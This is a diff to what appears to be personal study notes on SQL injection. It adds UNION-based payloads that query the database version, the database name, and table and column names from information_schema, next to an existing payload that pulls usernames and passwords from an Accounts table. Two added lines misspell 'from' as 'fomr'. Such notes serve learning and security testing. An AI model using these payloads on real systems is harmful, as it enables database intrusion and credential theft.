@@ -103,6 +103,10 @@ toc_sticky: true
 
 <code>' UNION SELECT user, pass FROM Accounts WHERE 'a'='a</code>
 
+<code>1 AND 1=2 UNION SELECT table_name, column_name, 1 FROM information_schema.columns
+
+</code>
+
 <h3>finding injection points</h3>
 <p>test all user supplied input</p>
 <p>GET, POST, HTTP Headers - User-Agent, Cookie, Accept</p>
@@ -124,8 +128,17 @@ toc_sticky: true
 <p>field will be determined on where 'asd' will appear on the webapp</p>
 <p>you can also check the source code for this</p>
 
+<h4>query version</h4>
+<code>1 union select 1, @@version, 3, 4</code>
+<h4>query db</h4>
+<code>1 union select 1, database(), 3, 4</code>
+<h4>query table_name</h4>
+<code>1 union select 1, table_name, 3, 4 fomr information_schema.tables</code>
+<h4>query table_name</h4>
+<code>1 union select 1, column_name, 3, 4 fomr information_schema.columns</code>
 <h4>try to query user()</h4>
 <code>' UNION SELECT user(), 'asd';-- -</code>
+
 
 <h2>SQLmap</h2>
 
